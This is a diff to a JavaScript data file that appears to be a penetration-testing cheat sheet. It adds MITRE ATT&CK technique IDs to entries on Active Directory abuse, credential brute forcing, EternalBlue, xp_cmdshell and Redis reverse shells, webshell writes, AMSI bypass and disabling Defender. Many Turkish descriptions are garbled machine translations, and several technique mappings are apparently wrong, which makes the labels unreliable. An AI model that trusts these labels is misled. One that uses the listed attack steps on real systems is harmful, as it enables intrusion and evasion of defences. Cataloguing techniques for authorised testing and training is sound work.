-            "desc_tr": "Who can DCSync (DS-Replication-Get-Changes-tüm)"
+            "desc_tr": "Who can DCSync (DS-Replication-Get-Changes-tüm)",
+            "attack": [
+              "T1003.003",
+              "T1003.006"
+            ]
           },
           {
             "title": "Find WriteDACL to Domain",
@@ -19517,7 +22646,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Who has GenericAll DomaAdmin üzerinde içinde"
+            "desc_tr": "Who has GenericAll DomaAdmin üzerinde içinde",
+            "attack": [
+              "T1069.002"
+            ]
           },
           {
             "title": "Find Shadow Credentials Path",
@@ -19535,7 +22667,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Shortest path any node DomaAdmin üzerinden'e içinde"
+            "desc_tr": "Shortest path any node DomaAdmin üzerinden'e içinde",
+            "attack": [
+              "T1069.002"
+            ]
           },
           {
             "title": "Find All Groups for User",
@@ -19624,7 +22759,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Enumerate ADCS with NTLM hash"
+            "desc_tr": "Enumerate ADCS with NTLM hash",
+            "attack": [
+              "T1550.002"
+            ]
           },
           {
             "title": "Certify Find (Windows)",
@@ -19777,7 +22915,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Relay DC$ auth to ADCS HTTP enrollment"
+            "desc_tr": "Relay DC$ auth to ADCS HTTP enrollment",
+            "attack": [
+              "T1557.001"
+            ]
           },
           {
             "title": "Golden Certificate (Certipy)",
@@ -19810,7 +22951,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Kerberos kimlik doğrulaması için sertifika kullan (Windows)"
+            "desc_tr": "Kerberos kimlik doğrulaması için sertifika kullan (Windows)",
+            "attack": [
+              "T1550.003"
+            ]
           },
           {
             "title": "PassTheCert LDAP",
@@ -19819,7 +22963,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Use certificate kimlik doğrulama to LDAP'e"
+            "desc_tr": "Use certificate kimlik doğrulama to LDAP'e",
+            "attack": [
+              "T1033"
+            ]
           },
           {
             "title": "PassTheCert Add DA",
@@ -19828,7 +22975,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Add user to Domain Admins via cert auth"
+            "desc_tr": "Add user to Domain Admins via cert auth",
+            "attack": [
+              "T1069.002"
+            ]
           }
         ],
         "name_tr": "Certificate Authentication"
@@ -19901,7 +23051,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Kaba kuvvet: kuvvet saldırısı FTP kimlik bilgileri"
+            "desc_tr": "Kaba kuvvet: kuvvet saldırısı FTP kimlik bilgileri",
+            "attack": [
+              "T1110.001"
+            ]
           },
           {
             "title": "FTP Bounce Scan",
@@ -19910,7 +23063,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Use FTP bounce for port taraması"
+            "desc_tr": "Use FTP bounce for port taraması",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "FTP Binary Transfer",
@@ -19953,7 +23109,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Connect to SSH server"
+            "desc_tr": "Connect to SSH server",
+            "attack": [
+              "T1021.004"
+            ]
           },
           {
             "title": "SSH with Private Key",
@@ -19962,7 +23121,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Connect using private key file"
+            "desc_tr": "Connect using private key file",
+            "attack": [
+              "T1552.001",
+              "T1021.004"
+            ]
           },
           {
             "title": "SSH Fix Key Permissions",
@@ -19971,7 +23134,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Fix özel anahtar permissions use önce"
+            "desc_tr": "Fix özel anahtar permissions use önce",
+            "attack": [
+              "T1552.001"
+            ]
           },
           {
             "title": "Hydra SSH Brute Force",
@@ -19980,7 +23146,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Kaba kuvvet: kuvvet saldırısı SSH kimlik bilgileri"
+            "desc_tr": "Kaba kuvvet: kuvvet saldırısı SSH kimlik bilgileri",
+            "attack": [
+              "T1110.001"
+            ]
           },
           {
             "title": "SSH User Enum (CVE-2018-15473)",
@@ -19998,7 +23167,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Yerel portu uzak servise yönlendir"
+            "desc_tr": "Yerel portu uzak servise yönlendir",
+            "attack": [
+              "T1090",
+              "T1572"
+            ]
           },
           {
             "title": "SSH Tunnel Remote Forward",
@@ -20007,7 +23180,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Expose yerel service uzak server üzerinde"
+            "desc_tr": "Expose yerel service uzak server üzerinde",
+            "attack": [
+              "T1090",
+              "T1572"
+            ]
           },
           {
             "title": "SSH Dynamic SOCKS Proxy",
@@ -20016,7 +23193,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Create SOCKS5 proxy through SSH"
+            "desc_tr": "Create SOCKS5 proxy through SSH",
+            "attack": [
+              "T1090",
+              "T1572"
+            ]
           },
           {
             "title": "SSH ProxyJump",
@@ -20095,7 +23276,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Kaba kuvvet: kuvvet saldırısı SMTP kimlik bilgileri"
+            "desc_tr": "Kaba kuvvet: kuvvet saldırısı SMTP kimlik bilgileri",
+            "attack": [
+              "T1110.001"
+            ]
           }
         ],
         "name_tr": "SMTP (25/587)"
@@ -20140,7 +23324,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Kaba kuvvet: kuvvet saldırısı POP3 kimlik bilgileri"
+            "desc_tr": "Kaba kuvvet: kuvvet saldırısı POP3 kimlik bilgileri",
+            "attack": [
+              "T1110.001"
+            ]
           },
           {
             "title": "cURL IMAP Read Mail",
@@ -20164,7 +23351,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Attempt AXFR zone transfer"
+            "desc_tr": "Attempt AXFR zone transfer",
+            "attack": [
+              "T1590.002"
+            ]
           },
           {
             "title": "DNS Reverse Lookup Zone",
@@ -20173,7 +23363,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Attempt reverse zone transfer"
+            "desc_tr": "Attempt reverse zone transfer",
+            "attack": [
+              "T1590.002"
+            ]
           },
           {
             "title": "DNSChef Spoof",
@@ -20191,7 +23384,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "DNS keşif fierce ile"
+            "desc_tr": "DNS keşif fierce ile",
+            "attack": [
+              "T1590.002"
+            ]
           }
         ],
         "name_tr": "DNS (53)"
@@ -20277,7 +23473,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "List SMB shares (no auth)"
+            "desc_tr": "List SMB shares (no auth)",
+            "attack": [
+              "T1135"
+            ]
           },
           {
             "title": "SMBClient Connect Share",
@@ -20319,7 +23518,10 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Paylaşımları ve izinleri listele"
+            "desc_tr": "Paylaşımları ve izinleri listele",
+            "attack": [
+              "T1135"
+            ]
           },
           {
             "title": "SMBMap Recursive Listing",
@@ -20328,7 +23530,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "List all files on all shares"
+            "desc_tr": "List all files on all shares",
+            "attack": [
+              "T1135"
+            ]
           },
           {
             "title": "SMBMap Execute Command",
@@ -20337,7 +23542,11 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Execute command via SMBMap"
+            "desc_tr": "Execute command via SMBMap",
+            "attack": [
+              "T1016",
+              "T1135"
+            ]
           },
           {
             "title": "Mount SMB Share (Linux)",
@@ -20356,7 +23565,10 @@ module.exports = [
               "advanced"
             ],
             "note": "Use Metasploit module exploit/windows/smb/ms17_010_eternalblue for reliability",
-            "desc_tr": "İstismar et: r EternalBlue SMB zafiyet(ler)"
+            "desc_tr": "İstismar et: r EternalBlue SMB zafiyet(ler)",
+            "attack": [
+              "T1210"
+            ]
           }
         ],
         "name_tr": "SMB (445/139)"
@@ -20400,7 +23612,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "NTLM hash ile MSSQL'e bağlan (Pass the Hash)"
+            "desc_tr": "NTLM hash ile MSSQL'e bağlan (Pass the Hash)",
+            "attack": [
+              "T1550.002"
+            ]
           },
           {
             "title": "Impacket MSSQL Custom Port",
@@ -20442,7 +23657,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Linked server üzerinde sorgu çalıştır (OpenQuery ile)"
+            "desc_tr": "Linked server üzerinde sorgu çalıştır (OpenQuery ile)",
+            "attack": [
+              "T1033"
+            ]
           },
           {
             "title": "MSSQL Impersonate User",
@@ -20473,7 +23691,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "xp_cmdshell üzerinden reverse shell al"
+            "desc_tr": "xp_cmdshell üzerinden reverse shell al",
+            "attack": [
+              "T1059.001"
+            ]
           },
           {
             "title": "MSSQL Enable xp_cmdshell",
@@ -20486,7 +23707,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "OS komutu çalıştırmak için xp_cmdshell'i etkinleştir"
+            "desc_tr": "OS komutu çalıştırmak için xp_cmdshell'i etkinleştir",
+            "attack": [
+              "T1033"
+            ]
           },
           {
             "title": "MSSQL List Databases",
@@ -20513,7 +23737,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Force NTLM auth to capture hash"
+            "desc_tr": "Force NTLM auth to capture hash",
+            "attack": [
+              "T1557.001"
+            ]
           },
           {
             "title": "MSSQL Write File",
@@ -20594,7 +23821,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Write webshell via MySQL"
+            "desc_tr": "Write webshell via MySQL",
+            "attack": [
+              "T1505.003"
+            ]
           },
           {
             "title": "MySQL User Hashes",
@@ -20612,7 +23842,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Kaba kuvvet: kuvvet saldırısı MySQL kimlik bilgileri"
+            "desc_tr": "Kaba kuvvet: kuvvet saldırısı MySQL kimlik bilgileri",
+            "attack": [
+              "T1110.001"
+            ]
           }
         ],
         "name_tr": "MySQL (3306)"
@@ -20627,7 +23860,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Connect to RDP with xfreerdp"
+            "desc_tr": "Connect to RDP with xfreerdp",
+            "attack": [
+              "T1021.001"
+            ]
           },
           {
             "title": "RDP with Domain",
@@ -20636,7 +23872,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Connect to RDP with domain credentials"
+            "desc_tr": "Connect to RDP with domain credentials",
+            "attack": [
+              "T1021.001"
+            ]
           },
           {
             "title": "RDP Pass-the-Hash",
@@ -20645,7 +23884,11 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Connect to RDP using NTLM hash (Restricted Admin required)"
+            "desc_tr": "Connect to RDP using NTLM hash (Restricted Admin required)",
+            "attack": [
+              "T1021.001",
+              "T1550.002"
+            ]
           },
           {
             "title": "RDP Drive Mount",
@@ -20654,7 +23897,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Mount local drive in RDP session"
+            "desc_tr": "Mount local drive in RDP session",
+            "attack": [
+              "T1021.001"
+            ]
           },
           {
             "title": "RDP Ignore Cert",
@@ -20663,7 +23909,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Sertifika uyarılarını yok say"
+            "desc_tr": "Sertifika uyarılarını yok say",
+            "attack": [
+              "T1021.001"
+            ]
           },
           {
             "title": "NLA Bypass Check",
@@ -20672,7 +23921,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Connect without NLA for older systems"
+            "desc_tr": "Connect without NLA for older systems",
+            "attack": [
+              "T1021.001"
+            ]
           },
           {
             "title": "Hydra RDP Brute",
@@ -20681,7 +23933,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Kaba kuvvet: kuvvet saldırısı RDP kimlik bilgileri"
+            "desc_tr": "Kaba kuvvet: kuvvet saldırısı RDP kimlik bilgileri",
+            "attack": [
+              "T1110.001"
+            ]
           },
           {
             "title": "RDesktop Connect",
@@ -20690,7 +23945,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Connect via rdesktop"
+            "desc_tr": "Connect via rdesktop",
+            "attack": [
+              "T1021.001"
+            ]
           }
         ],
         "name_tr": "RDP (3389)"
@@ -20714,7 +23972,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Kaba kuvvet: kuvvet saldırısı VNC password"
+            "desc_tr": "Kaba kuvvet: kuvvet saldırısı VNC password",
+            "attack": [
+              "T1110.001"
+            ]
           },
           {
             "title": "Nmap VNC Auth Check",
@@ -20723,7 +23984,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Kontrol et: VNC kimlik doğrulama type"
+            "desc_tr": "Kontrol et: VNC kimlik doğrulama type",
+            "attack": [
+              "T1046"
+            ]
           }
         ],
         "name_tr": "VNC (5900)"
@@ -20788,7 +24052,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Write SSH authorized_keys via Redis"
+            "desc_tr": "Write SSH authorized_keys via Redis",
+            "attack": [
+              "T1098.004"
+            ]
           },
           {
             "title": "Redis Write Webshell",
@@ -20802,7 +24069,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Write PHP webshell via Redis"
+            "desc_tr": "Write PHP webshell via Redis",
+            "attack": [
+              "T1505.003"
+            ]
           },
           {
             "title": "Redis Cron Job RCE",
@@ -20816,7 +24086,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Write cron job for reverse shell via Redis"
+            "desc_tr": "Write cron job for reverse shell via Redis",
+            "attack": [
+              "T1059.004"
+            ]
           }
         ],
         "name_tr": "Redis (6379)"
@@ -20867,7 +24140,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "kimlik doğrulama bypass NoSQL enjeksiyüzerinden üzerinde"
+            "desc_tr": "kimlik doğrulama bypass NoSQL enjeksiyüzerinden üzerinde",
+            "attack": [
+              "T1190"
+            ]
           }
         ],
         "name_tr": "MongoDB (27017)"
@@ -20914,7 +24190,11 @@ module.exports = [
               "advanced"
             ],
             "note": "Then on target: /tmp/bash -p",
-            "desc_tr": "Write SUID bash if no_root_squash is set"
+            "desc_tr": "Write SUID bash if no_root_squash is set",
+            "attack": [
+              "T1059.004",
+              "T1548.001"
+            ]
           }
         ],
         "name_tr": "NFS (2049)"
@@ -20965,7 +24245,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Get Domain Admin group members"
+            "desc_tr": "Get Domain Admin group members",
+            "attack": [
+              "T1069.002"
+            ]
           },
           {
             "title": "LDAP Password in Attributes",
@@ -21000,7 +24283,10 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Connect to WinRM with Evil-WinRM"
+            "desc_tr": "Connect to WinRM with Evil-WinRM",
+            "attack": [
+              "T1021.006"
+            ]
           },
           {
             "title": "Evil-WinRM with Hash",
@@ -21009,7 +24295,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Pass-the-hash WinRM üzerinden"
+            "desc_tr": "Pass-the-hash WinRM üzerinden",
+            "attack": [
+              "T1021.006",
+              "T1550.002"
+            ]
           },
           {
             "title": "Evil-WinRM with SSL",
@@ -21018,7 +24308,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Connect to WinRM with SSL (5986)"
+            "desc_tr": "Connect to WinRM with SSL (5986)",
+            "attack": [
+              "T1021.006"
+            ]
           },
           {
             "title": "Evil-WinRM File Upload",
@@ -21027,7 +24320,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Upload file to target"
+            "desc_tr": "Upload file to target",
+            "attack": [
+              "T1021.006"
+            ]
           },
           {
             "title": "Evil-WinRM Run Script",
@@ -21037,7 +24333,11 @@ module.exports = [
               "tool"
             ],
             "note": "Run inside evil-winrm session",
-            "desc_tr": "Load and run PowerShell script"
+            "desc_tr": "Load and run PowerShell script",
+            "attack": [
+              "T1059.001",
+              "T1021.006"
+            ]
           },
           {
             "title": "Evil-WinRM Upload (In-Session)",
@@ -21047,7 +24347,10 @@ module.exports = [
               "essential"
             ],
             "note": "Run inside evil-winrm session",
-            "desc_tr": "Upload file from within evil-winrm session"
+            "desc_tr": "Upload file from within evil-winrm session",
+            "attack": [
+              "T1021.006"
+            ]
           },
           {
             "title": "Evil-WinRM Download (In-Session)",
@@ -21057,7 +24360,10 @@ module.exports = [
               "essential"
             ],
             "note": "Run inside evil-winrm session",
-            "desc_tr": "Download file from target within session"
+            "desc_tr": "Download file from target within session",
+            "attack": [
+              "T1021.006"
+            ]
           },
           {
             "title": "Evil-WinRM Execute PS Script (In-Session)",
@@ -21067,7 +24373,11 @@ module.exports = [
               "tool"
             ],
             "note": "Run inside evil-winrm session",
-            "desc_tr": "Execute a PowerShell script in memory"
+            "desc_tr": "Execute a PowerShell script in memory",
+            "attack": [
+              "T1059.001",
+              "T1021.006"
+            ]
           },
           {
             "title": "Evil-WinRM Menu (In-Session)",
@@ -21077,7 +24387,10 @@ module.exports = [
               "essential"
             ],
             "note": "Run inside evil-winrm session",
-            "desc_tr": "Evil-WinRM yerleşik komutlarını listele"
+            "desc_tr": "Evil-WinRM yerleşik komutlarını listele",
+            "attack": [
+              "T1021.006"
+            ]
           },
           {
             "title": "Evil-WinRM Bypass AMSI (In-Session)",
@@ -21087,7 +24400,11 @@ module.exports = [
               "essential"
             ],
             "note": "Run inside evil-winrm session — run before loading any tool",
-            "desc_tr": "AMSI bypass — AV tespiti olmadan araç çalıştırmak için"
+            "desc_tr": "AMSI bypass — AV tespiti olmadan araç çalıştırmak için",
+            "attack": [
+              "T1021.006",
+              "T1562.001"
+            ]
           },
           {
             "title": "Evil-WinRM Load DLL (In-Session)",
@@ -21097,7 +24414,10 @@ module.exports = [
               "advanced"
             ],
             "note": "Run inside evil-winrm session",
-            "desc_tr": "Hedef üzerinde DLL'i belleğe yükle"
+            "desc_tr": "Hedef üzerinde DLL'i belleğe yükle",
+            "attack": [
+              "T1021.006"
+            ]
           },
           {
             "title": "Evil-WinRM .NET Assembly (In-Session)",
@@ -21112,7 +24432,11 @@ module.exports = [
               "essential"
             ],
             "note": "Run inside evil-winrm session — requires -e flag on connect",
-            "desc_tr": ".NET assembly (exe) bellek içinde çalıştır"
+            "desc_tr": ".NET assembly (exe) bellek içinde çalıştır",
+            "attack": [
+              "T1558.003",
+              "T1021.006"
+            ]
           },
           {
             "title": "Evil-WinRM Load PS Script (In-Session)",
@@ -21128,7 +24452,12 @@ module.exports = [
               "essential"
             ],
             "note": "Run inside evil-winrm session — requires -s flag on connect. Type script name to load, then call functions",
-            "desc_tr": "PS script'i session'a yükle ve fonksiyonları çağır"
+            "desc_tr": "PS script'i session'a yükle ve fonksiyonları çağır",
+            "attack": [
+              "T1087",
+              "T1059.001",
+              "T1021.006"
+            ]
           },
           {
             "title": "Evil-WinRM Services (In-Session)",
@@ -21138,7 +24467,10 @@ module.exports = [
               "essential"
             ],
             "note": "Run inside evil-winrm session",
-            "desc_tr": "Windows servislerini listele"
+            "desc_tr": "Windows servislerini listele",
+            "attack": [
+              "T1021.006"
+            ]
           },
           {
             "title": "Evil-WinRM Post-Connect Recon (In-Session)",
@@ -21155,7 +24487,13 @@ module.exports = [
               "essential"
             ],
             "note": "Run inside evil-winrm session",
-            "desc_tr": "Evil-WinRM bağlantısından sonra ilk keşif komutları"
+            "desc_tr": "Evil-WinRM bağlantısından sonra ilk keşif komutları",
+            "attack": [
+              "T1033",
+              "T1082",
+              "T1016",
+              "T1087"
+            ]
           },
           {
             "title": "Evil-WinRM WinPEAS from Session",
@@ -21168,7 +24506,11 @@ module.exports = [
               "essential"
             ],
             "note": "Run inside evil-winrm session",
-            "desc_tr": "WinPEAS yükle ve çalıştır (yetki yükseltme keşfi)"
+            "desc_tr": "WinPEAS yükle ve çalıştır (yetki yükseltme keşfi)",
+            "attack": [
+              "T1021.006",
+              "T1068"
+            ]
           },
           {
             "title": "Evil-WinRM SharpHound from Session",
@@ -21182,7 +24524,12 @@ module.exports = [
               "essential"
             ],
             "note": "Run inside evil-winrm session",
-            "desc_tr": "SharpHound yükle ve çalıştır (BloodHound veri toplama)"
+            "desc_tr": "SharpHound yükle ve çalıştır (BloodHound veri toplama)",
+            "attack": [
+              "T1087.002",
+              "T1482",
+              "T1021.006"
+            ]
           }
         ],
         "name_tr": "WinRM (5985/5986)"
@@ -21207,7 +24554,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Bypass PowerShell execution policy"
+            "desc_tr": "Bypass PowerShell execution policy",
+            "attack": [
+              "T1059.001"
+            ]
           },
           {
             "title": "PowerShell Download Cradle",
@@ -21216,7 +24566,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Scripti indir ve bellekte çalıştır"
+            "desc_tr": "Scripti indir ve bellekte çalıştır",
+            "attack": [
+              "T1059.001"
+            ]
           },
           {
             "title": "PowerShell EncodedCommand",
@@ -21225,7 +24578,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Execute base64 encoded command"
+            "desc_tr": "Execute base64 encoded command",
+            "attack": [
+              "T1059.001"
+            ]
           },
           {
             "title": "Encode PS Command (Linux)",
@@ -21234,7 +24590,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Encode PowerShell command to base64"
+            "desc_tr": "Encode PowerShell command to base64",
+            "attack": [
+              "T1059.001"
+            ]
           },
           {
             "title": "PowerShell Invoke-Expression",
@@ -21243,7 +24602,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Execute string as command"
+            "desc_tr": "Execute string as command",
+            "attack": [
+              "T1059.001"
+            ]
           },
           {
             "title": "PowerShell Download File",
@@ -21252,7 +24614,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Download file to disk"
+            "desc_tr": "Download file to disk",
+            "attack": [
+              "T1059.001",
+              "T1105"
+            ]
           },
           {
             "title": "PowerShell Check Language Mode",
@@ -21261,7 +24627,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Kontrol et: if constrained language mode içinde"
+            "desc_tr": "Kontrol et: if constrained language mode içinde",
+            "attack": [
+              "T1059.001"
+            ]
           },
           {
             "title": "PowerShell Version",
@@ -21270,7 +24639,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Kontrol et: PowerShell version"
+            "desc_tr": "Kontrol et: PowerShell version",
+            "attack": [
+              "T1059.001"
+            ]
           },
           {
             "title": "Disable AMSI (Reflection)",
@@ -21279,7 +24651,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Devre dışı bırak: AMSI reflectiüzerinden üzerinde"
+            "desc_tr": "Devre dışı bırak: AMSI reflectiüzerinden üzerinde",
+            "attack": [
+              "T1562.001"
+            ]
           }
         ],
         "name_tr": "PowerShell Basics & Execution"
@@ -21295,7 +24670,10 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Load PowerView into memory"
+            "desc_tr": "Load PowerView into memory",
+            "attack": [
+              "T1059.001"
+            ]
           },
           {
             "title": "Get Domain Info",
@@ -21322,7 +24700,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Enumerate all domain users"
+            "desc_tr": "Enumerate all domain users",
+            "attack": [
+              "T1087"
+            ]
           },
           {
             "title": "Get User Description",
@@ -21331,7 +24712,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Find passwords in user descriptions"
+            "desc_tr": "Find passwords in user descriptions",
+            "attack": [
+              "T1087"
+            ]
           },
           {
             "title": "Get Domain Groups",
@@ -21340,7 +24724,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Tüm domain gruplarını listele"
+            "desc_tr": "Tüm domain gruplarını listele",
+            "attack": [
+              "T1069.002"
+            ]
           },
           {
             "title": "Get Domain Admin Members",
@@ -21349,7 +24736,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "List Domain Admin group members"
+            "desc_tr": "List Domain Admin group members",
+            "attack": [
+              "T1069.002"
+            ]
           },
           {
             "title": "Get Domain Computers",
@@ -21385,7 +24775,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Enumerate domain trusts"
+            "desc_tr": "Enumerate domain trusts",
+            "attack": [
+              "T1482"
+            ]
           },
           {
             "title": "Get Forest Trusts",
@@ -21394,7 +24787,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Enumerate forest trusts"
+            "desc_tr": "Enumerate forest trusts",
+            "attack": [
+              "T1482"
+            ]
           },
           {
             "title": "Find Interesting Files",
@@ -21412,7 +24808,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Find all service principal names"
+            "desc_tr": "Find all service principal names",
+            "attack": [
+              "T1558.003",
+              "T1087"
+            ]
           },
           {
             "title": "Invoke-Kerberoast",
@@ -21421,7 +24821,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Kerberoast tüm SPNs and output hashes"
+            "desc_tr": "Kerberoast tüm SPNs and output hashes",
+            "attack": [
+              "T1558.003"
+            ]
           },
           {
             "title": "Get ASREPRoast Targets",
@@ -21430,7 +24833,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Find accounts with pre-auth disabled"
+            "desc_tr": "Find accounts with pre-auth disabled",
+            "attack": [
+              "T1558.004",
+              "T1087"
+            ]
           },
           {
             "title": "Get ACL Rights",
@@ -21482,7 +24889,10 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Load PowerUp into memory"
+            "desc_tr": "Load PowerUp into memory",
+            "attack": [
+              "T1059.001"
+            ]
           },
           {
             "title": "Invoke-AllChecks",
@@ -21563,7 +24973,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Find cached GPP passwords"
+            "desc_tr": "Find cached GPP passwords",
+            "attack": [
+              "T1552.006"
+            ]
           }
         ],
         "name_tr": "PowerUp — Privilege Escalation"
@@ -21578,7 +24991,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Classic AMSI bypass reflectiüzerinden üzerinde"
+            "desc_tr": "Classic AMSI bypass reflectiüzerinden üzerinde",
+            "attack": [
+              "T1562.001"
+            ]
           },
           {
             "title": "AMSI Bypass - Patching",
@@ -21587,7 +25003,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Patch AMSI.dll in memory"
+            "desc_tr": "Patch AMSI.dll in memory",
+            "attack": [
+              "T1562.001"
+            ]
           },
           {
             "title": "Disable Windows Defender (Admin)",
@@ -21596,7 +25015,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Devre dışı bırak: Defender real-time protection"
+            "desc_tr": "Devre dışı bırak: Defender real-time protection",
+            "attack": [
+              "T1562.001"
+            ]
           },
           {
             "title": "Add Defender Exclusion",
@@ -21629,7 +25051,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "İçe aktar: Active Directory PowerShell module"
+            "desc_tr": "İçe aktar: Active Directory PowerShell module",
+            "attack": [
+              "T1059.001"
+            ]
           },
           {
             "title": "Get-ADUser All",
@@ -21638,7 +25063,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "List all AD users"
+            "desc_tr": "List all AD users",
+            "attack": [
+              "T1087"
+            ]
           },
           {
             "title": "Get-ADGroup Members",
@@ -21647,7 +25075,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "List members of a group"
+            "desc_tr": "List members of a group",
+            "attack": [
+              "T1069.002"
+            ]
           },
           {
             "title": "Get-ADComputer All",
@@ -21709,7 +25140,10 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Get SYSTEM shell via SMB"
+            "desc_tr": "Get SYSTEM shell via SMB",
+            "attack": [
+              "T1021.002"
+            ]
           },
           {
             "title": "PsExec with Hash",
@@ -21718,7 +25152,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "PsExec NTLM hash kullanarak"
+            "desc_tr": "PsExec NTLM hash kullanarak",
+            "attack": [
+              "T1021.002",
+              "T1550.002"
+            ]
           },
           {
             "title": "WMIExec Remote Shell",
@@ -21728,7 +25166,10 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Get shell via WMI (semi-interactive)"
+            "desc_tr": "Get shell via WMI (semi-interactive)",
+            "attack": [
+              "T1047"
+            ]
           },
           {
             "title": "WMIExec with Hash",
@@ -21737,7 +25178,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "WMIExec NTLM hash kullanarak"
+            "desc_tr": "WMIExec NTLM hash kullanarak",
+            "attack": [
+              "T1047",
+              "T1550.002"
+            ]
           },
           {
             "title": "SMBExec Remote Shell",
@@ -21746,7 +25191,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Get SYSTEM shell via SMB service creation"
+            "desc_tr": "Get SYSTEM shell via SMB service creation",
+            "attack": [
+              "T1021.002"
+            ]
           },
           {
             "title": "AtExec Command",
@@ -21755,7 +25203,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
